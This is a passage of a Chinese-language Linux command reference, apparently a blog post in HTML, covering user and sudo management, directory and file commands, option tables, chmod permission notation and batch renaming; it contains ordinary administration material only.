        <content type="html"><![CDATA[<h2 id="用户操作">用户操作</h2><h3 id="修改密码（passwd）">修改密码（passwd）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132259181.png" alt="image-20231221132259181"></p><h3 id="创建新用户（adduser）">创建新用户（adduser）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132357801.png" alt="image-20231221132357801"></p><h3 id="删除用户（deluser）">删除用户（deluser）</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo deluser &lt;username&gt; --remove-home</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132840664.png" alt="image-20231221132840664"></p><h3 id="查看当前用户（whoami）">查看当前用户（whoami）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132422791.png" alt="image-20231221132422791"></p><h3 id="切换到用户（su）">切换到用户（su）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -l <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132619718.png" alt="image-20231221132619718"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-c</code></td><td>将 COMMAND 传递至启动的 shell</td></tr><tr><td><code>-h</code></td><td>显示帮助信息并退出</td></tr><tr><td><code>-l</code></td><td>将 shell 设为登录 shell</td></tr><tr><td><code>-p</code></td><td>不重置环境变量并保持同一 shell</td></tr><tr><td><code>-s</code></td><td>使用 SHELL 而非 passwd 中的默认值</td></tr></tbody></table><h3 id="查看所属用户组（groups）">查看所属用户组（groups）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groups <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132654167.png" alt="image-20231221132654167"></p><p>其中冒号之前表示用户，后面表示该用户所属的用户组</p><h3 id="授予sudo权限">授予sudo权限</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -G sudo <span class="variable">&lt;username&gt;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sudo adduser <span class="variable">&lt;username&gt;</span> sudo</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132741744.png" alt="image-20231221132741744"></p><h3 id="移除sudo权限">移除sudo权限</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo deluser <span class="tag">&lt;<span class="name">username</span>&gt;</span> sudo</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132808881.png" alt="image-20231221132808881"></p><h2 id="目录操作">目录操作</h2><h3 id="查看当前路径（pwd）">查看当前路径（pwd）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-P</code></td><td>显示实际物理路径，而非使用连接（link）路径</td></tr><tr><td><code>-L</code></td><td>当目录为连接路径时，显示连接路径</td></tr></tbody></table><p><img src="https://doc.shiyanlou.com/courses/uid871732-20200826-1598406299890" alt="图片描述"></p><h3 id="切换目录（cd）">切换目录（cd）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;<span class="built_in">dir</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><code>cd ~</code></td><td>进入当前用户主目录</td></tr><tr><td><code>cd /</code></td><td>进入系统根目录</td></tr><tr><td><code>cd ..</code></td><td>从当前目录进入父目录</td></tr><tr><td><code>cd -</code></td><td>从当前目录进入上次所在目录</td></tr></tbody></table><p><img src="https://oss.iuoyt.com/img/posts/image-20231221132945769.png" alt="image-20231221132945769"></p><h3 id="查看目录内容（ls）">查看目录内容（ls）</h3><ul><li><p>只显示文件名：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221133003656.png" alt="image-20231221133003656"></p></li><li><p>显示详细信息：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line"><span class="built_in">ls</span> -l</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221133018031.png" alt="image-20231221133018031"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-a</code></td><td>–all 列出目录下的所有文件，包括以 . 开头的隐含文件</td></tr><tr><td><code>-l</code></td><td>除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来</td></tr><tr><td><code>-h</code></td><td>–human-readable 以容易理解的格式列出文件大小（例如 1K 234M 2G)</td></tr><tr><td><code>-t</code></td><td>以文件修改时间排序</td></tr></tbody></table><p>隐藏文件前带<code>.</code></p></li><li><p>查看目录完整属性：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">dl</span> [<span class="symbol">&lt;dirpath&gt;</span>]</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221133100480.png" alt="image-20231221133100480"></p></li><li><p>显示所有文件大小</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -aSsh</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221133334152.png" alt="image-20231221133334152"></p></li></ul><h3 id="创建目录（mkdir）">创建目录（mkdir）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> [option] &lt;<span class="built_in">dir</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221141238014.png" alt="image-20231221141238014"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-m</code></td><td>设定权限&lt;模式&gt;</td></tr><tr><td><code>-p</code></td><td>多级创建，可以是一个路径名称。若路径中某些目录尚不存在，系统将自动建立好</td></tr><tr><td><code>-v </code></td><td>每次创建新目录都显示信息</td></tr></tbody></table><h3 id="删除目录（rm-r）">删除目录（rm -r）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r [option] &lt;<span class="built_in">dir</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221141153974.png" alt="image-20231221141153974"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-f</code></td><td>忽略不存在的文件，从不给出提示</td></tr><tr><td><code>-i</code></td><td>进行交互式删除</td></tr><tr><td><code>-r</code></td><td>指示 rm 将参数中列出的全部目录和子目录均递归地删除（删除目录时必须）</td></tr><tr><td><code>-v</code></td><td>详细显示进行的步骤</td></tr></tbody></table><h3 id="复制目录（cp-r）">复制目录（cp -r）</h3><p>也就是递归复制文件</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [<span class="keyword">option</span>] <span class="language-xml"><span class="tag">&lt;<span class="name">dir</span>&gt;</span> <span class="tag">&lt;<span class="name">目标位置</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221142500949.png" alt="image-20231221142500949"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-t</code></td><td>指定目标目录</td></tr><tr><td><code>-i</code></td><td>覆盖前询问（使前面的 -n 选项失效）</td></tr><tr><td><code>-n</code></td><td>不要覆盖已存在的文件（使前面的 -i 选项失效）</td></tr><tr><td><code>-s</code></td><td>对源文件建立符号链接，而非复制文件</td></tr><tr><td><code>-f</code></td><td>强行复制文件或目录，不论目的文件或目录是否已经存在</td></tr><tr><td><code>-u</code></td><td>只在源文件的修改时间较目的文件更新时，或是对应的目的文件并不存在，才复制文件</td></tr></tbody></table><h3 id="移动目录（mv）">移动目录（mv）</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv [<span class="keyword">option</span>] <span class="language-xml"><span class="tag">&lt;<span class="name">dir</span>&gt;</span> <span class="tag">&lt;<span class="name">目标位置</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221141444450.png" alt="image-20231221141444450"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-b</code></td><td>若需覆盖文件，则覆盖前先行备份</td></tr><tr><td><code>-f</code></td><td>如果目标文件已经存在，不会询问而直接覆盖</td></tr><tr><td><code>-i</code></td><td>若目标文件已经存在时，就会询问是否覆盖</td></tr><tr><td><code>-u</code></td><td>若目标文件已经存在，且源文件比较新，才会更新</td></tr><tr><td><code>-t</code></td><td>该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后</td></tr></tbody></table><h2 id="文件操作">文件操作</h2><h3 id="查看文件信息（ll）">查看文件信息（ll）</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ll</span> <span class="symbol">&lt;file&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221142520514.png" alt="image-20231221142520514"></p><h3 id="查看文件大小（du-h）">查看文件大小（du -h）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h &lt;<span class="built_in">dir</span>/file&gt;</span><br></pre></td></tr></table></figure><h3 id="查看文件类型（file）">查看文件类型（file）</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span> &lt;<span class="built_in">file</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221142534603.png" alt="image-20231221142534603"></p><h3 id="查看文件（cat）">查看文件（cat）</h3><ul><li><p>正序查看</p>  <figure class="highlight plaintext"><figcaption><span><file></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat [option] &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221142851473.png" alt="image-20231221142851473"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-A</code></td><td>等价于 <code>-vET</code></td></tr><tr><td><code>-b</code></td><td>对非空输出行编号</td></tr><tr><td><code>-e</code></td><td>等价于 <code>-vE</code></td></tr><tr><td><code>-E</code></td><td>在每行结束处显示 $</td></tr><tr><td><code>-n</code></td><td>对输出的所有行编号，由 1 开始对所有输出的行数编号</td></tr><tr><td><code>-s</code></td><td>有连续两行以上的空白行，就代换为一行的空白行</td></tr><tr><td><code>-t</code></td><td>与 <code>-vT</code> 等价</td></tr><tr><td><code>-T</code></td><td>将跳格字符显示为 <code>^I</code></td></tr><tr><td><code>-u</code></td><td>（被忽略）</td></tr><tr><td><code>-v </code></td><td>使用 <code>^</code> 和 <code>M-</code>引用，除了 LFD 和 TAB 之外</td></tr></tbody></table></li><li><p>倒序查看</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac &lt;<span class="built_in">file</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221142908437.png" alt="image-20231221142908437"></p></li></ul><h3 id="文件计算行号查看（nl）">文件计算行号查看（nl）</h3><ul><li><p>nl 命令在 linux 系统中用来计算文件中的行号。nl 可以将输出的文件内容自动加上行号，其默认的结果与 cat -n 有点不太一样。 nl 可以将行号做较多的显示设计，包括位数与是否自动补齐 0 等等的功能。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl [<span class="keyword">option</span>] [<span class="keyword">file</span>]</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221143002997.png" alt="image-20231221143002997"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-b</code></td><td>指定行号指定的方式，主要有两种：</td></tr><tr><td><code>-b a</code></td><td>表示不论是否为空行，也同样列出行号（类似 <code>cat -n</code>）</td></tr><tr><td><code>-b t</code></td><td>如果有空行，空的那一行不要列出行号（默认值）</td></tr><tr><td><code>-n</code></td><td>列出行号表示的方法，主要有三种：</td></tr><tr><td><code>-n ln</code></td><td>行号在屏幕的最左方显示</td></tr><tr><td><code>-n rn</code></td><td>行号在自己栏位的最右方显示，且不加 0</td></tr><tr><td><code>-n rz</code></td><td>行号在自己栏位的最右方显示，且加 0</td></tr><tr><td><code>-w</code></td><td>行号栏位的占用的位数</td></tr></tbody></table></li></ul><h3 id="阅读文件">阅读文件</h3><h4 id="more">more</h4><ul><li><p>功能类似 <code>cat</code> ，<code>cat</code> 命令是将整个文件的内容从上到下显示在屏幕上。 <code>more</code> 命令会一页一页的显示，方便使用者逐页阅读，而最基本的指令就是按<kbd>Enter</kbd>向下滚动一行，按<kbd>Space</kbd>往下一页显示，按<kbd>B</kbd>键就会往回（back）一页显示，按<kbd>=</kbd>输出当前行行号，按下 <kbd>H</kbd>显示帮助，按下<kbd>Q</kbd>退出。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221145143202.png" alt="image-20231221145143202"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>+n</code></td><td>从笫 n 行开始显示</td></tr><tr><td><code>-n</code></td><td>定义屏幕大小为 n 行</td></tr><tr><td><code>+/pattern</code></td><td>在每个档案显示前搜寻该字串（pattern），然后从该字串前两行之后开始显示</td></tr><tr><td><code>-c</code></td><td>从顶部清屏，然后显示</td></tr><tr><td><code>-d</code></td><td>提示“Press space to continue，’q’ to quiet”，禁用响铃功能</td></tr><tr><td><code>-p</code></td><td>通过清除窗口而不是滚屏来对文件进行换页，与-c 选项相似</td></tr><tr><td><code>-s</code></td><td>把连续的多个空行显示为一行</td></tr><tr><td><code>-u</code></td><td>把文件内容中的下划线去掉</td></tr></tbody></table></li></ul><h4 id="less">less</h4><ul><li><p>是 linux 正统查看文件内容的工具，功能极其强大</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">less</span> [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-e</code></td><td>当文件显示结束后，自动离开</td></tr><tr><td><code>-f</code></td><td>强迫打开特殊文件，例如外围设备代号、目录和二进制文件</td></tr><tr><td><code>-i</code></td><td>忽略搜索时的大小写</td></tr><tr><td><code>-m</code></td><td>显示类似 more 命令的百分比</td></tr><tr><td><code>-N</code></td><td>显示每行的行号</td></tr><tr><td><code>-s</code></td><td>显示连续空行为一行</td></tr></tbody></table></li><li><p>常用操作：</p><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>/字符串</td><td>向下搜索“字符串”的功能</td></tr><tr><td>?字符串</td><td>向上搜索“字符串”的功能</td></tr><tr><td>n</td><td>重复前一个搜索（与 / 或 ? 有关）</td></tr><tr><td>N</td><td>反向重复前一个搜索（与 / 或 ? 有关）</td></tr><tr><td>b</td><td>向前翻一页</td></tr><tr><td>d</td><td>向后翻半页</td></tr><tr><td>q</td><td>退出 less 命令</td></tr><tr><td>空格键</td><td>向后翻一页</td></tr><tr><td>向上键</td><td>向上翻动一行</td></tr><tr><td>向下键</td><td>向下翻动一行</td></tr></tbody></table></li></ul><h4 id="head">head</h4><ul><li><p>用来显示档案的开头至标准输出中，默认 head 命令打印其相应文件的开头 10 行。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221145838128.png" alt="image-20231221145838128"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-q</td><td>隐藏文件名</td></tr><tr><td>-v</td><td>显示文件名</td></tr><tr><td>-c&lt;字节&gt;</td><td>显示字节数</td></tr><tr><td>-n&lt;行数&gt;</td><td>显示的行数</td></tr></tbody></table></li></ul><h4 id="tail">tail</h4><ul><li><p>用于显示指定文件末尾内容。常用查看日志文件，默认为尾部10行。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221145910940.png" alt="image-20231221145910940"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-f</code></td><td>循环读取</td></tr><tr><td><code>-q</code></td><td>不显示处理信息</td></tr><tr><td><code>-v</code></td><td>显示详细的处理信息</td></tr><tr><td><code>-c&lt;字节&gt;</code></td><td>显示的字节数</td></tr><tr><td><code>-n&lt;行数&gt;</code></td><td>显示行数</td></tr></tbody></table></li></ul><h3 id="创建文件（touch）">创建文件（touch）</h3><figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">touch</span> &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><ul><li><p>批量创建文件</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">touch</span> file&#123;<span class="number">1</span>..<span class="number">5</span>&#125;.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221150514197.png" alt="image-20231221150514197"></p></li></ul><h3 id="删除文件（rm）">删除文件（rm）</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221150534482.png" alt="image-20231221150534482"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-f</code></td><td>忽略不存在的文件，从不给出提示</td></tr><tr><td><code>-i</code></td><td>进行交互式删除</td></tr><tr><td><code>-r</code></td><td>指示 rm 将参数中列出的全部目录和子目录均递归地删除</td></tr><tr><td><code>-v</code></td><td>详细显示进行的步骤</td></tr></tbody></table><h3 id="编辑文件（vim）">编辑文件（vim）</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> <span class="symbol">&lt;file&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建并写入文件（echo-）">创建并写入文件（echo &gt;&gt;）</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Text&quot;</span> &gt;&gt; <span class="symbol">&lt;file&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221151525050.png" alt="image-20231221151525050"></p><h3 id="多行编辑（cat）">多行编辑（cat）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; &lt;file&gt; &lt;&lt; <span class="string">eof</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">eof</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221151402910.png" alt="image-20231221151402910"></p><h3 id="复制文件（cp）">复制文件（cp）</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [<span class="keyword">option</span>] <span class="language-xml"><span class="tag">&lt;<span class="name">file</span>&gt;</span> <span class="tag">&lt;<span class="name">目标位置</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221150733380.png" alt="image-20231221150733380"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-t</code></td><td>指定目标目录</td></tr><tr><td><code>-i</code></td><td>覆盖前询问（使前面的 -n 选项失效）</td></tr><tr><td><code>-n</code></td><td>不要覆盖已存在的文件（使前面的 -i 选项失效）</td></tr><tr><td><code>-s</code></td><td>对源文件建立符号链接，而非复制文件</td></tr><tr><td><code>-f</code></td><td>强行复制文件或目录，不论目的文件或目录是否已经存在</td></tr><tr><td><code>-u</code></td><td>只在源文件的修改时间较目的文件更新时，或是对应的目的文件并不存在，才复制文件</td></tr></tbody></table><h3 id="设置文件权限（chmod）">设置文件权限（chmod）</h3><table><thead><tr><th style="text-align:left">#</th><th style="text-align:left">权限</th><th style="text-align:left">rwx</th><th style="text-align:left">二进制</th></tr></thead><tbody><tr><td style="text-align:left">7</td><td style="text-align:left">读 + 写 + 执行</td><td style="text-align:left">rwx</td><td style="text-align:left">111</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">读 + 写</td><td style="text-align:left">rw-</td><td style="text-align:left">110</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">读 + 执行</td><td style="text-align:left">r-x</td><td style="text-align:left">101</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">只读</td><td style="text-align:left">r–</td><td style="text-align:left">100</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">写 + 执行</td><td style="text-align:left">-wx</td><td style="text-align:left">011</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">只写</td><td style="text-align:left">-w-</td><td style="text-align:left">010</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">只执行</td><td style="text-align:left">–x</td><td style="text-align:left">001</td></tr><tr><td style="text-align:left">0</td><td style="text-align:left">无</td><td style="text-align:left">—</td><td style="text-align:left">000</td></tr></tbody></table><ul><li><p>数字表示</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="tag">&lt;<span class="name">rwx</span>&gt;</span> <span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>文件调用权限分为三级 :</p><ul><li>文件所有者（Owner）</li><li>用户所在用户组（Group）</li><li>其它用户（Other Users）</li></ul></li><li><p>权限分为三种：</p><ul><li>可读（Read）</li><li>可写（Write）</li><li>可执行（Execute）</li></ul></li></ul><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/file-permissions-rwx.jpg" alt="img"></p></li><li><p>字符表示</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;<span class="name">op</span>&gt;</span><span class="tag">&lt;<span class="name">permission</span>&gt;</span> <span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>用户组部分表示：</p><table><thead><tr><th style="text-align:left">who</th><th style="text-align:left">用户类型</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>u</code></td><td style="text-align:left">user</td><td style="text-align:left">文件所有者</td></tr><tr><td style="text-align:left"><code>g</code></td><td style="text-align:left">group</td><td style="text-align:left">文件所有者所在组</td></tr><tr><td style="text-align:left"><code>o</code></td><td style="text-align:left">others</td><td style="text-align:left">所有其他用户</td></tr><tr><td style="text-align:left"><code>a</code></td><td style="text-align:left">all</td><td style="text-align:left">所有用户, 相当于 <em>ugo</em></td></tr></tbody></table></li><li><p>符号部分表示：</p><table><thead><tr><th style="text-align:left">Operator</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>+</code></td><td style="text-align:left">为指定的用户类型增加权限</td></tr><tr><td style="text-align:left"><code>-</code></td><td style="text-align:left">去除指定用户类型的权限</td></tr><tr><td style="text-align:left"><code>=</code></td><td style="text-align:left">设置指定用户权限的设置，即将用户类型的所有权限重新设置</td></tr></tbody></table></li><li><p>权限部分表示：</p><table><thead><tr><th style="text-align:left">模式</th><th style="text-align:left">名字</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>r</code></td><td style="text-align:left">读</td><td style="text-align:left">设置为可读权限</td></tr><tr><td style="text-align:left"><code>w</code></td><td style="text-align:left">写</td><td style="text-align:left">设置为可写权限</td></tr><tr><td style="text-align:left"><code>x</code></td><td style="text-align:left">执行权限</td><td style="text-align:left">设置为可执行权限</td></tr><tr><td style="text-align:left"><code>X</code></td><td style="text-align:left">特殊执行权限</td><td style="text-align:left">只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td></tr><tr><td style="text-align:left"><code>s</code></td><td style="text-align:left">setuid/gid</td><td style="text-align:left">当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td></tr><tr><td style="text-align:left"><code>t</code></td><td style="text-align:left">粘贴位</td><td style="text-align:left">设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td></tr></tbody></table></li></ul></li><li><p>效果相同语句举例：</p>  <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="keyword">a</span>=rwx <span class="built_in">file</span></span><br><span class="line">chmod <span class="number">777</span> <span class="built_in">file</span></span><br></pre></td></tr></table></figure>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod ug=rwx,o=x <span class="built_in">file</span></span><br><span class="line">chmod <span class="number">771</span> <span class="built_in">file</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="移动文件（mv）">移动文件（mv）</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv [<span class="keyword">option</span>] <span class="language-xml"><span class="tag">&lt;<span class="name">file</span>&gt;</span> <span class="tag">&lt;<span class="name">目标位置</span>&gt;</span></span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-b</code></td><td>若需覆盖文件，则覆盖前先行备份</td></tr><tr><td><code>-f</code></td><td>如果目标文件已经存在，不会询问而直接覆盖</td></tr><tr><td><code>-i</code></td><td>若目标文件已经存在时，就会询问是否覆盖</td></tr><tr><td><code>-u</code></td><td>若目标文件已经存在，且源文件比较新，才会更新</td></tr><tr><td><code>-t</code></td><td>该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后</td></tr></tbody></table><h3 id="重命名文件（mv）">重命名文件（mv）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv <span class="tag">&lt;<span class="name">旧名称</span>&gt;</span> <span class="tag">&lt;<span class="name">新名称</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>批量重命名：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 批量将这5个后缀为.txt的文本文件重命名为以.c为后缀的文件:</span></span><br><span class="line"><span class="attribute">rename</span> <span class="string">&#x27;s/\.txt/\.c/&#x27;</span> <span class="regexp">*.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量将这5个文件，文件名和后缀改为大写:</span></span><br><span class="line">rename <span 